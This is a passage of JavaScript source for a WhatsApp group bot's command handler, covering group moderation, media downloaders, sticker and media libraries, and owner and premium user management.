ntwame.splice(off, 1)
fs.writeFileSync('./database/antiwame.json', JSON.stringify(ntwame))
replygcxeon('Success in turning off antiwame in this group')
} else {
  await replygcxeon(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'antilinkgc': {
if (!m.isGroup) return replygcxeon(mess.group)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (!isAdmins && !isOwner) return replygcxeon(mess.admin)
if (args[0] === "on") {
if (Antilinkgc) return replygcxeon('Already activated')
ntlinkgc.push(from)
fs.writeFileSync('./database/antilinkgc.json', JSON.stringify(ntlinkgc))
replygcxeon('Success in turning on antiwame in this group')
var groupe = await Kyuu.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Kyuu.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to send group link in this group, one who sends will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!Antilinkgc) return replygcxeon('Already deactivated')
let off = ntlinkgc.indexOf(from)
ntlinkgc.splice(off, 1)
fs.writeFileSync('./database/antilinkgc.json', JSON.stringify(ntlinkgc))
replygcxeon('Success in turning off antiwame in this group')
} else {
await replygcxeon(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
   case 'leavegc': {
                if (!isOwner) return replygcxeon(mess.owner)
                await Kyuu.groupLeave(m.chat).then((res) => replygcxeon(jsonformat(res))).catch((err) => replygcxeon(jsonformat(err)))
            }
            break
case 'add': {
if (!m.isGroup) return replygcxeon(mess.group)
if (!isAdmins && !isOwner) return replygcxeon(mess.admin)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Kyuu.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => replygcxeon(jsonformat(res))).catch((err) => replygcxeon(jsonformat(err)))
}
break
case 'closetime': {
if (!m.isGroup) return replygcxeon(mess.group)
if (!isAdmins && !isOwner) return replygcxeon(mess.admin)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return replygcxeon('*Choose:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
}
replygcxeon(`Close Time ${q} Starting from now`)
setTimeout(() => {
var nomor = m.participant
const close = `*On time* Group Closed By Admin\nNow Only Admins Can Send Messages`
Kyuu.groupSettingUpdate(from, 'announcement')
replygcxeon(close)
}, timer)
}
break
           case 'ephemeral': {
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                if (!isAdmins) return replygcxeon(mess.admin)
                if (!text) return replygcxeon('Enter the value enable/disable')
                if (args[0] === 'enable') {
                    await Kyuu.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL }).then((res) => replygcxeon(jsonformat(res))).catch((err) => replygcxeon(jsonformat(err)))
                } else if (args[0] === 'disable') {
                    await Kyuu.sendMessage(m.chat, { disappearingMessagesInChat: false }).then((res) => replygcxeon(jsonformat(res))).catch((err) => replygcxeon(jsonformat(err)))
                }
            }
            break
            case 'delete': case 'del': {
                if (!m.quoted) throw false
                let { chat, fromMe, id, isBaileys } = m.quoted
                if (!isBaileys) return replygcxeon('The message was not sent by a bot!')
                 Kyuu.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
            case 'linkgroup': case 'linkgc': case 'gclink': case 'grouplink': {
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                let response = await Kyuu.groupInviteCode(m.chat)
                Kyuu.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nGroup Link : ${groupMetadata.subject}`, m, { detectLink: true })
            }
            break
case 'opentime': {
if (!m.isGroup) return replygcxeon(mess.group)
if (!isAdmins && !isOwner) return replygcxeon(mess.admin)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return replygcxeon('*Choose:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
}
replygcxeon(`Open Time ${q} Starting from now`)
setTimeout(() => {
var nomor = m.participant
const open = `*On time* Group Opened By Admin\n Now Members Can Send Messages`
Kyuu.groupSettingUpdate(from, 'not_announcement')
replygcxeon(open)
}, timer)
}
break
case 'kick': {
if (!m.isGroup) return replygcxeon(mess.group)
if (!isAdmins && !isOwner) return replygcxeon(mess.admin)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Kyuu.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => replygcxeon(jsonformat(res))).catch((err) => replygcxeon(jsonformat(err)))
}
break
    case 'setname': case 'setsubject': {
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                if (!isAdmins) return replygcxeon(mess.admin)
                if (!text) return replygcxeon('Text ?')
                await Kyuu.groupUpdateSubject(m.chat, text).then((res) => replygcxeon(mess.success)).catch((err) => replygcxeon(jsonformat(err)))
            }
            break
          case 'setdesc': case 'setdesk': {
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                if (!isAdmins) return replygcxeon(mess.admin)
                if (!text) return replygcxeon('Text ?')
                await Kyuu.groupUpdateDescription(m.chat, text).then((res) => replygcxeon(mess.success)).catch((err) => replygcxeon(jsonformat(err)))
            }
            break
case 'setppgroup': case 'setgcpp': case 'setgrouppp': {
if (!m.isGroup) return replygcxeon(mess.group)
if (!isAdmins && !isOwner) return replygcxeon(mess.admin)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (!quoted) return replygcxeon(`Where is the picture?`)
if (!/image/.test(mime)) return replygcxeon(`Send/Reply Image With Caption ${prefix + command}`)
if (/webp/.test(mime)) return replygcxeon(`Send/Reply Image With Caption ${prefix + command}`)
var mediz = await Kyuu.downloadAndSaveMediaMessage(quoted, 'ppgc.jpeg')
if (args[0] == `/panjang`) {
var { img } = await generateProfilePicture(mediz)
await Kyuu.query({
tag: 'iq',
attrs: {
to: m.chat,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(mediz)
replygcxeon(`Success`)
} else {
var memeg = await Kyuu.updateProfilePicture(m.chat, { url: mediz })
fs.unlinkSync(mediz)
replygcxeon(`Success`)
}
}
break
case 'promote': {
if (!m.isGroup) return replygcxeon(mess.group)
if (!isAdmins && !isOwner) return replygcxeon(mess.admin)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Kyuu.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => replygcxeon(jsonformat(res))).catch((err) => replygcxeon(jsonformat(err)))
}
break
case 'demote': {
if (!m.isGroup) return replygcxeon(mess.group)
if (!isAdmins && !isOwner) return replygcxeon(mess.admin)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Kyuu.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => replygcxeon(jsonformat(res))).catch((err) => replygcxeon(jsonformat(err)))
}
break
case 'hidetag': {
if (!m.isGroup) return replygcxeon(mess.group)
if (!isAdmins && !isOwner) return replygcxeon(mess.admin)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
Kyuu.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
}
break
case 'tagall': {
if (!m.isGroup) return replygcxeon(mess.group)
if (!isAdmins && !isOwner) return replygcxeon(mess.admin)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
me = m.sender
let teks = `╚»˙·٠${themeemoji}●♥ Tag All ♥●${themeemoji}٠·˙«╝ 
 
 😶 *Tagger :*  @${me.split('@')[0]}
 🌿 *Message : ${q ? q : 'no message'}*\n\n`
for (let mem of participants) {
teks += `${themeemoji} @${mem.id.split('@')[0]}\n`
}
Kyuu.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break
case 'ebinary': {
if (!q) return replygcxeon(`Send/reply text with captions ${prefix + command}`)
replygcxeon(mess.wait)
let { eBinary } = require('./scrape/binary')
let eb = await eBinary(`${q}`)
replygcxeon(eb)
}
break
case 'dbinary': {
if (!q) return replygcxeon(`Send/reply text with captions ${prefix + command}`)
replygcxeon(mess.wait)
let { dBinary } = require('./scrape/binary')
let db = await dBinary(`${q}`)
replygcxeon(db)
}
break
case 'fbdl': case 'facebook': {
if (!q) return replygcxeon(`Where's the link??`)
let anu = await fetchJson(`https://xeonapi.onrender.com/api/dowloader/fbdown?url=${q}&apikey=a565ddca`)
Kyuu.sendMessage(m.chat, { video: { url: anu.result.HD }, caption: 'Here you go!.'}, {quoted: m})
}
break
case 'tiktok':{ 
if (!text) return replygcxeon( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return replygcxeon(`Link Invalid!!`)
replygcxeon(mess.wait)
require('./lib/tiktok').Tiktok(q).then( data => {
Kyuu.sendMessage(m.chat, { caption: `Here you go!`, video: { url: data.watermark }}, {quoted:m})
})
}
break
case 'tiktokaudio':{
if (!text) return replygcxeon( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return replygcxeon(`Link Invalid!!`)
replygcxeon(mess.wait)
require('./lib/tiktok').Tiktok(q).then( data => {
Kyuu.sendMessage(m.chat, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m })
})
}
break
case 'mediafire':
if (!q) return replygcxeon(`Where is the link?`)
if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) return replygcxeon('The link you sent is not a mediafire link or the link is invalid!')
replygcxeon(mess.wait)
let medfr = await scp1.mediafire(q)
await Kyuu.sendMessage(from, {document:{url:medfr.link},jpegThumbnail : defaultpp, fileName:`Downloaded By ${m.pushName}.${medfr.mime}`, mimetype:`application/${mime}`},{quoted:m})
break
case 'google': {
if (!q) return replygcxeon(`Example : ${prefix + command} ${botname}`)
replygcxeon(mess.wait)
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `Google Search From : ${text}\n\n`
for (let g of res) {
teks += `⭔ *Title* : ${g.title}\n`
teks += `⭔ *Description* : ${g.snippet}\n`
teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
} 
replygcxeon(teks)
})
}
break
case 'happymod':{
if (!q) return replygcxeon(`Example ${prefix+command} Sufway surfer mod`)
replygcxeon(mess.wait)
let kat = await scp1.happymod(q)
replygcxeon(util.format(kat))
}
break
case 'recipe':{
if (!q) return replygcxeon(`Example ${prefix+command} samosa`)
replygcxeon(mess.wait)
let ker = await scp1.cariresep(q)
replygcxeon(util.format(ker))
}
break
case 'readrecipe':{
if (!q) return replygcxeon(`Example ${prefix+command} https://resepkoki.id/resep/resep-ayam-geprek-keju/`)
replygcxeon(mess.wait)
let rain = await scp1.bacaresep(q)
let dty = `Recipe Below
Title : ${rain.judul_nya}
Time : ${rain.waktu_nya}
Result : ${rain.hasil_nya}
Degree of difficulty : ${rain.tingkat_kesulitan}
Material :
${rain.bahan_nya}`
Kyuu.sendMessage(m.chat,{
image:{
url:rain.thumb_nya},
caption:dty,
jpegThumbnail: defaultpp},
{quoted:m})
}
break
case 'search':
case 'yts': case 'ytsearch': {
                if (!isRegistered) return replygcxeon('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama|umur!*')
                if (!text) return replygcxeon(`Example : ${prefix + command} story wa anime`)
                let yts = require("yt-search")
                let search = await yts(text)
                let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
                let no = 1
                for (let i of search.all) {
                    teks += `${themeemoji} No : ${no++}\n${themeemoji} Type : ${i.type}\n${themeemoji} Video ID : ${i.videoId}\n${themeemoji} Title : ${i.title}\n${themeemoji} Views : ${i.views}\n${themeemoji} Duration : ${i.timestamp}\n${themeemoji} Uploaded : ${i.ago}\n${themeemoji} Url : ${i.url}\n\n─────────────────\n\n`
                }
                Kyuu.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
            }
            break
case 'xxxxplay':{
if (!isRegistered) return replygcxeon('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama|umur!*')
if (m.isGroup) return replygcxeon(mess.private)
if (!text) return replygcxeon(`Example : ${prefix+command} story wa anime`)
replygcxeon(`Mencari🔎\n\nJika Bot delay harap tunggu jangan di spam, spam = banned`)
let search = await yts(text)
url = search.videos[0].url
let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
eek = await getBuffer(anu.thumbnail)
owned = `${ownernumber}@s.whatsapp.net`
ngen = `
Title : ${anu.title}
Ext : Search
ID : ${anu.videoId}
Viewers : ${anu.views}
Upload At : ${anu.ago}
Author : ${anu.author.name}
Channel : ${anu.author.url}
Link : ${anu.url}

Copy the link above and type the .ytmp3 link for audio and the .ytmp4 link for video`
Kyuu.sendMessage(m.chat, { image : eek, caption: ngen }, { quoted: m})
}
break
case 'play':  case 'song': case 'ytmp3': {
if (!isRegistered) return replygcxeon('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama|umur!*')
if (!isPrem) return replyprem(mess.premium)
if (!text) return replygcxeon(`Example : ${prefix + command} anime whatsapp status`)
Kyuu.sendMessage(m.chat, {
      react: {
          text: '🕒',
          key: m.key,
      }
  })
const xeonplaymp3 = require('./lib/ytdl2')
const { fetchBuffer } = require("./lib/myfunc2")
let yts = require("youtube-yts")
        let search = await yts(text)
        let anup3k = search.videos[0]
const pl= await xeonplaymp3.mp3(anup3k.url)
await Kyuu.sendMessage(m.chat,{
    audio: fs.readFileSync(pl.path),
    fileName: anup3k.title + '.mp3',
    mimetype: 'audio/mp4', ptt: true,
    contextInfo:{
        externalAdReply:{
            title:anup3k.title,
            body: botname,
            thumbnail: await fetchBuffer(pl.meta.image),
            mediaType:2,
            mediaUrl:anup3k.url,
        }

    },
},{quoted:m})
await fs.unlinkSync(pl.path)
}
break
case 'ytmp4': case 'ytvideo': {
if (!isRegistered) return replygcxeon('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama|umur!*')
replygcxeon(`Mencari🔎\n\nJika Bot delay harap tunggu jangan di spam, spam = banned`)
const xeonvidoh = require('./lib/ytdl2')
if (args.length < 1 || !isUrl(text) || !xeonvidoh.isYTUrl(text)) replygcxeon(`Where is the link??\n\nExample : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`)
const vid=await xeonvidoh.mp4(text)
const ytc=`
*${themeemoji}Tittle:* ${vid.title}
*${themeemoji}Date:* ${vid.date}
*${themeemoji}Duration:* ${vid.duration}
*${themeemoji}Quality:* ${vid.quality}`
await Kyuu.sendMessage(m.chat,{
    video: {url:vid.videoUrl},
    caption: ytc
},{quoted:m})
}
break
case 'ytvxxx': case 'ytmp4xxx': case 'mp4xxx':{
if (!isRegistered) return replygcxeon('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama|umur!*')
if (!text) return replygcxeon('Enter the link!!!')
replygcxeon(mess.wait)
downloadMp4(text)
}
break
case 'ytaxxx': case 'ytmp3xxx': case 'mp3xxx':{
if (!isRegistered) return replygcxeon('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama|umur!*')
if (!text) return replygcxeon('Enter the link!!!')
replygcxeon(mess.wait)
downloadMp3(text)
}
break  
case 'getcase':
if (!isOwner) return replygcxeon(mess.owner)
const getCase = (cases) => {
return "case"+`'${cases}'`+fs.readFileSync("XeonCheems7.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
}
replygcxeon(`${getCase(q)}`)
break
case 'addprem':
if (!isOwner) return replygcxeon(mess.owner)
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Kyuu.onWhatsApp(prrkek)
if (ceknya.length == 0) return replygcxeon(`Enter a valid and registered number on WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
replygcxeon(`The Number ${prrkek} Has Been Premium!`)
break
    case 'toptv':{
if (!isOwner) return replygcxeon('*Khusus Owner*')
 if (!quoted) throw `Balas Video Dengan Caption ${prefix + command}`
  if (/video/.test(mime)) {
var ppt = quoted
var ptv = generateWAMessageFromContent(from, proto.Message.fromObject({
	"ptvMessage": ppt
}), { userJid: from, quoted:m})
Kyuu.relayMessage(from, ptv.message, { messageId: ptv.key.id })
}
}
break
case 'delprem':
if (!isOwner) return replygcxeon(mess.owner)
if (!args[0]) return replygcxeon(`Use ${prefix+command} nomor\nExample ${prefix+command} 916909137213`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
replygcxeon(`The Number ${ya} Has Been Removed Premium!`)
break
case 'addbadword':{
if (!isOwner) return replygcxeon(mess.owner)
if (args.length < 1) return replygcxeon('Whats the word?')
if (BadXeon.includes(q)) return replygcxeon("The word is already in use")
BadXeon.push(q)
fs.writeFileSync('./database/bad.json', JSON.stringify(BadXeon))
replygcxeon(`Success Adding Bad Word\nCheck by typing ${prefix}listbadword`)
}
break
case 'delbadword':{
if (!isOwner) return replygcxeon(mess.owner)
if (args.length < 1) return replygcxeon('Enter the word')
if (!BadXeon.includes(q)) return replygcxeon("The word does not exist in the database")
let wanu = BadXeon.indexOf(q)
BadXeon.splice(wanu, 1)
fs.writeFileSync('./database/bad.json', JSON.stringify(BadXeon))
replygcxeon(`Success deleting bad word ${q}`)
}
break
case 'listbadword':{
let teks = '┌──⭓「 *BadWord List* 」\n│\n'
for (let x of BadXeon) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${BadXeon.length}*`
replygcxeon(teks)
}
break
case 'addvideo':{
if (!isOwner) return replygcxeon(mess.owner)
if (args.length < 1) return replygcxeon('Whats the video name?')
if (VideoXeon.includes(q)) return replygcxeon("The name is already in use")
let delb = await Kyuu.downloadAndSaveMediaMessage(quoted)
VideoXeon.push(q)
await fsx.copy(delb, `./XeonMedia/video/${q}.mp4`)
fs.writeFileSync('./XeonMedia/database/xeonvideo.json', JSON.stringify(VideoXeon))
fs.unlinkSync(delb)
replygcxeon(`Success Adding Video\nCheck by typing ${prefix}listvideo`)
}
break
case 'delvideo':{
if (!isOwner) return replygcxeon(mess.owner)
if (args.length < 1) return replygcxeon('Enter the video name')
if (!VideoXeon.includes(q)) return replygcxeon("The name does not exist in the database")
let wanu = VideoXeon.indexOf(q)
VideoXeon.splice(wanu, 1)
fs.writeFileSync('./XeonMedia/database/xeonvideo.json', JSON.stringify(VideoXeon))
fs.unlinkSync(`./XeonMedia/video/${q}.mp4`)
replygcxeon(`Success deleting video ${q}`)
}
break
case 'listvideo':{
let teks = '┌──⭓「 *Video List* 」\n│\n'
for (let x of VideoXeon) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${VideoXeon.length}*`
replygcxeon(teks)
}
break
case 'addimage':{
if (!isOwner) return replygcxeon(mess.owner)
if (args.length < 1) return replygcxeon('Whats the image name?')
if (ImageXeon.includes(q)) return replygcxeon("The name is already in use")
let delb = await Kyuu.downloadAndSaveMediaMessage(quoted)
ImageXeon.push(q)
await fsx.copy(delb, `./XeonMedia/image/${q}.jpg`)
fs.writeFileSync('./XeonMedia/database/xeonimage.json', JSON.stringify(ImageXeon))
fs.unlinkSync(delb)
replygcxeon(`Success Adding Image\nCheck by typing ${prefix}listimage`)
}
break
case 'delimage':{
if (!isOwner) return replygcxeon(mess.owner)
if (args.length < 1) return replygcxeon('Enter the image name')
if (!ImageXeon.includes(q)) return replygcxeon("The name does not exist in the database")
let wanu = ImageXeon.indexOf(q)
ImageXeon.splice(wanu, 1)
fs.writeFileSync('./XeonMedia/database/xeonimage.json', JSON.stringify(ImageXeon))
fs.unlinkSync(`./XeonMedia/image/${q}.jpg`)
replygcxeon(`Success deleting image ${q}`)
}
break
case 'listimage':{
let teks = '┌──⭓「 *Image List* 」\n│\n'
for (let x of ImageXeon) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${ImageXeon.length}*`
replygcxeon(teks)
}
break
case 'addsticker':{
if (!isOwner) return replygcxeon(mess.owner)
if (args.length < 1) return replygcxeon('Whats the sticker name?')
if (StickerXeon.includes(q)) return replygcxeon("The name is already in use")
let delb = await Kyuu.downloadAndSaveMediaMessage(quoted)
StickerXeon.push(q)
await fsx.copy(delb, `./XeonMedia/sticker/${q}.webp`)
fs.writeFileSync('./XeonMedia/database/xeonsticker.json', JSON.stringify(StickerXeon))
fs.unlinkSync(delb)
replygcxeon(`Success Adding Sticker\nCheck by typing ${prefix}liststicker`)
}
break
case 'delsticker':{
if (!isOwner) return replygcxeon(mess.owner)
if (args.length < 1) return replygcxeon('Enter the sticker name')
if (!StickerXeon.includes(q)) return replygcxeon("The name does not exist in the database")
let wanu = StickerXeon.indexOf(q)
StickerXeon.splice(wanu, 1)
fs.writeFileSync('./XeonMedia/database/xeonsticker.json', JSON.stringify(StickerXeon))
fs.unlinkSync(`./XeonMedia/sticker/${q}.webp`)
replygcxeon(`Success deleting sticker ${q}`)
}
break
case 'liststicker':{
let teks = '┌──⭓「 *Sticker List* 」\n│\n'
for (let x of StickerXeon) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${StickerXeon.length}*`
replygcxeon(teks)
}
break
case 'addvn':{
if (!isOwner) return replygcxeon(mess.owner)
if (args.length < 1) return replygcxeon('Whats the audio name?')
if (VoiceNoteXeon.includes(q)) return replygcxeon("The name is already in use")
let delb = await Kyuu.downloadAndSaveMediaMessage(quoted)
VoiceNoteXeon.push(q)
await fsx.copy(delb, `./XeonMedia/audio/${q}.mp3`)
fs.writeFileSync('./XeonMedia/database/xeonvn.json', JSON.stringify(VoiceNoteXeon))
fs.unlinkSync(delb)
replygcxeon(`Success Adding Audio\nCheck by typing ${prefix}listvn`)
}
break
case 'delvn':{
if (!isOwner) return replygcxeon(mess.owner)
if (args.length < 1) return replygcxeon('Enter the vn name')
if (!VoiceNoteXeon.includes(q)) return replygcxeon("The name does not exist in the database")
let wanu = VoiceNoteXeon.indexOf(q)
VoiceNoteXeon.splice(wanu, 1)
fs.writeFileSync('./XeonMedia/database/xeonvn.json', JSON.stringify(VoiceNoteXeon))
fs.unlinkSync(`./XeonMedia/audio/${q}.mp3`)
replygcxeon(`Success deleting vn ${q}`)
}
break
case 'listvn':{
let teks = '┌──⭓「 *VN List* 」\n│\n'
for (let x of VoiceNoteXeon) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${VoiceNoteXeon.length}*`
replygcxeon(teks)
}
break
case 'addowner':
if (!isOwner) return replygcxeon(mess.owner)
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} ${ownernumber}`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await Kyuu.onWhatsApp(bnnd)
if (ceknye.length == 0) return replygcxeon(`Enter A Valid And Registered Number On WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
replygcxeon(`Number ${bnnd} Has Become An Owner!!!`)
break
case 'delowner':
if (!isOwner) return replygcxeon(mess.owner)
if (!args[0]) return replygcxeon(`Use ${prefix+command} nomor\nExample ${prefix+command} 916909137213`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
replygcxeon(`The Numbrr ${ya} Has been deleted from owner list by the owner!!!`)
break
case 'listpremium': case 'listprem':
teks = '*Premium List*\n\n'
for (let Kyuu of prem) {
teks += `- ${Kyuu}\n`
}
teks += `\n*Total : ${prem.length}*`
Kyuu.sendMessage(m.chat, { text: teks.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": prem } })
break
case 'setexif': {
               if (!isOwner) return replygcxeon(mess.owner)
               if (!text) return replygcxeon(`Example : ${prefix + command} packname|author`)
          global.packname = text.split("|")[0]
          global.author = text.split("|")[1]
          replygcxeom(`Exif has been successfully changed to\n\n${themeemoji} Packname : ${global.packname}\n${themeemoji} Author : ${global.author}`)
            }
            break
case 'setppbot': case 'setbotpp': {
if (!isOwner) return replygcxeon(mess.owner)
if (!quoted) return replygcxeon(`Send/Reply Image With Caption ${prefix + command}`)
if (!/image/.test(mime)) return replygcxeon(`Send/Reply Image With Caption ${prefix + command}`)
if (/webp/.test(mime)) return replygcxeon(`Send/Reply Image With Caption ${prefix + command}`)
var medis = await Kyuu.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `/panjang`) {
var { img } = await generateProfilePicture(medis)
await Kyuu.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
replygcxeon(`Success`)
} else {
var memeg = await Kyuu.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
replygcxeon(`Success`)
}
}
break
case 'creategc': case 'creategroup': {
if (!isOwner) return replygcxeon(mess.owner)
if (!args.join(" ")) return replygcxeon(`Use ${prefix+command} groupname`)
try {
let cret = await Kyuu.groupCreate(args.join(" "), [])
let response = await Kyuu.groupInviteCode(cret.id)
teks = `     「 Create Group 」

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}

https://chat.whatsapp.com/${response}
       `
Kyuu.sendMessage(m.chat, { text:teks, mentions: await Kyuu.parseMention(teks)}, {quoted:m})
} catch {
replygcxeon("Error!")
}
}
break
case 'snobg': {
if (!quoted) return replygcxeon(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
if (/image/.test(mime)) {
let media = await Kyuu.downloadAndSaveMediaMessage(quoted)
let encmedia = await Kyuu.sendImageAsSticker(m.chat, await rmbg(media), m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
replygcxeon(`Send/Reply Images With Captions ${prefix+command}`)
}
}
break
case 'cry': case 'kill': case 'hug': case 'pat': case 'lick': 
case 'kiss': case 'bite': case 'yeet': case 'bully': case 'bonk':
case 'wink': case 'poke': case 'nom': case 'slap': case 'smile': 
case 'wave': case 'awoo': case 'blush': case 'smug': case 'glomp': 
case 'happy': case 'dance': case 'cringe': case 'cuddle': case 'highfive': 
case 'shinobu': case 'handhold': {
if (!isPrem) return replyprem(mess.group)
axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
Kyuu.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'tomp4': case 'tovideo': {
                if (!quoted) return replygcxeon('Reply Image')
                if (!/webp/.test(mime)) return replygcxeon(`reply sticker with caption *${prefix + command}*`)
                replygcxeon(mess.wait)
		        let { webp2mp4File } = require('./lib/uploader')
                let media = await Kyuu.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await Kyuu.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
            case 'toaud': case 'toaudio': {
            if (!/video/.test(mime) && !/audio/.test(mime)) return replygcxeon(`Send/Reply Video/Audio You Want to Use as Audio With Caption ${prefix + command}`)
            if (!quoted) return replygcxeon(`Send/Reply Video/Audio You Want to Use as Audio With Caption ${prefix + command}`)
            m.reply(mess.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            Kyuu.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
            }
            break
            case 'tomp3': {
            if (/document/.test(mime)) return replygcxeon(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
            if (!/video/.test(mime) && !/audio/.test(mime)) return replygcxeon(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
            if (!quoted) return replygcxeon(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
            replygcxeon(mess.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
